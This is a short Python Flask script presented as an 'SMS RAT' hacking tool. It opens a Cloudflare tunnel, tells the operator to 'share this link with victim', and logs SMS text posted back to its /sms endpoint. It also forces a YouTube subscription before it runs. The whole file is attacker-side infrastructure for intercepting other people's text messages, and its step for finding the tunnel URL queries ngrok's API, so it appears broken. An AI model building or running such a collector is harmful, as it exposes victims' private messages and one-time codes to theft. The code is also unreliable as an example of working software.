import os
import time
from flask import Flask, request, render_template
import subprocess

# Banner with red box and green text
def banner():
    print("\033[91m╔════════════════════════════════╗")
    print("\033[92m║        HCO - SMS - RAT         ║")
    print("\033[91m╚════════════════════════════════╝\033[0m")

# Auto YouTube Redirect
def youtube_redirect():
    print("\033[93mThis tool is not free. Subscribe to our YouTube channel first...\033[0m")
    time.sleep(8)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\033[92mAfter subscribing, press ENTER to continue...\033[0m")

# Start Flask App
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/sms', methods=['POST'])
def receive_sms():
    sms_data = request.form.get("message")
    print(f"\n\033[96m[SMS RECEIVED]\033[0m {sms_data}")
    return "SMS Received", 200

def start_cloudflare():
    os.system("pkill cloudflared > /dev/null 2>&1")
    print("\n\033[93m[•] Starting Cloudflare tunnel...\033[0m")
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(6)
    os.system("curl -s https://api.ipify.org && echo")
    print("\n\033[92m[✓] Server & Tunnel running.\n[✓] Share this link with victim:\033[0m")
    os.system("curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.-]*\.trycloudflare.com'")

if __name__ == '__main__':
    banner()
    youtube_redirect()
    start_cloudflare()
    app.run(port=5000)
